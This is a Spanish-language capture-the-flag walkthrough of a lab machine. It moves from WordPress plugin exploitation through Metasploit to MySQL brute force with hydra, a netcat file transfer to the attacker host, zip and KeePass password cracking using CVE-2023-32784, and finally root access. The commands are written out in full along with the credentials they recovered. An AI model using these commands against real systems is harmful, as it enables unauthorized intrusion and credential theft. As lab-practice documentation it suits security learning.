PORT   STATE SERVICE
22/tcp open  ftp
80/tcp open  http
3306   open mysql

-Hacemos fuzzing y encontamos la ruta /wordpress

-Usamos wpscan para listar usuarios y plugins, encontramos al usuario --> Mortadela

-Probamos a hacer fuerza bruta perno no funciona

-Usamos wpscan para enumerar plugins de forma agresiva:
	-wpscan --url http://192.168.1.134/wordpress -e ap,u --plugins-detection aggressive 
		-Encontramos el siguiente plugins con la vulnerabilidad: 
			wpdiscuz 7.0.4 Unauthenticated file upload

-No podemos explotarlo con un exploit Python de 'Searchsploit' , por que la web va demasiado lenta y no responde a las peticiones (si fuera bien podríamos entrar por ahí)


### 2 opciones:

1-Metasploit si que nos deja, le pasamos la configuración correcta:
	-search wpdiscuz 7.0.4
	-Módulo --> unix/webapp/wp_wpdiscuz_unauthenticated_file_upload
		-set RHOSTS 192.168.1.134
		-set lhost 192.168.1.135
		-set targeturi wordpress
		-set blogpath /index.php/2024/04/01/hola-mundo/
		-run
		meterpreter >

2-Probamos a hacer fuerza bruta a mysql con hydra:
	-hydra mysql://192.168.1.134 -l mortadela -P /usr/share/wordlists/rockyou.txt -V
		-No encontramos nada
	-Probamos con el usuario root:
		-hydra mysql://192.168.1.134 -l root -P /usr/share/wordlists/rockyou.txt -V
			-user root  -password: cassandra

-Entramos a mysql remotamente con las credenciales obtenidas:
	-mysql -uroot -pcassandra -h 192.168.1.134  -P 3306 --ssl=0

-Entramos en la BD 'confidencial' y listamos la tabla usuarios:
	-Encontramos la contraseña del usuario mortadela:
		MariaDB [confidencial]> select * from usuarios;
		+-----------+------------------+
		| usuario   | contraseña       |
		+-----------+------------------+
		| mortadela | Juanikokukunero8 |
		+-----------+------------------+

-Nos autenticamos por ssh y obtenemos acceso a la máquina:
	ssh mortadela@192.168.1.134
	-password: Juanikokukunero8
	mortadela@mortadela:~$

## Escalada de Privilegios

-En la carpeta /opt encontramos el siguiente archivo:
	-muyconfidencial.zip

-Al hacer unzip nos pide una contraseña, nos pasamos el archivo a nuestra máquina para descrifrarla con john. Como no tiene Python instalado, transferimos el archivo con Netcat:
	-En la máquina víctima:
		-cat muyconfidencial.zip | nc 192.168.1.135 1234
	-En nuestra máquina:
		-nc -lvp 1234 > muyconfidencial.zip

-Generamos hash con zip2john y lo rompemos con john:
	-zip2john muyconfidencial.zip > hash.txt
	-john --wordlist=/usr/share/wordlists/rockyou.txt hash2.txt
		-password: pinkgirl

-Hacemos un unzip en nuestra máquina y obtenemos 2 archivos:
	Database.kdbx y KeePass.DMP

-Explotamos vulnerabilidad 'CVE-2023-32784' , la cual nos permite obtener la contraseña de un archivo keepas.DMP

-Nos descargamos el siguiente exploit y lo ejecutamos:
	-https://github.com/matro7sh/keepass-dump-masterkey
	-Lo ejecutamos: python3 poc.py KeePass.DMP
		Possible password: ●aritrini12345

-Nos falta una letra para completar la contraseña

-Creamos un diccionario con mayúsculas y minúsculas que pruebe alrededor de 'aritrini12345':
	-crunch 14 14 ABCDEFGHIJKLMNÑOPQRSTUVWXYZabcdefghijklmnñopqrstuvwxyz -t @aritrini12345 -o diccionario.txt
		-crunch: herramienta para generar diccionarios de fuerza bruta personalizados
		-14 14: Indica que el diccionario generado contendrá únicamente palabras de **14 caracteres** de longitud (mínimo y máximo)
		-t @aritrini12345: Define un **patrón fijo** para la generación de contraseñas

-Creamos un hash del archivo Database.kdbx con keepass2john y lo rompemos con john proporcionando el diccionario personalizado:
	-keepass2john Database.kdbx > hash2.txt
	-john --wordlist=diccionario.txt hash2.txt
		Maritrini12345

-Nos instalamos keepass2 y abrimos el archivo proporcionando la contraseña:
	-sudo apt install keepass2 
	-keepass2 Database.kdbx

-La  contraseña de root es --> Juanikonokukunero

-su root
-password: Juanikonokukunero

root@mortadela:/# whoami
root





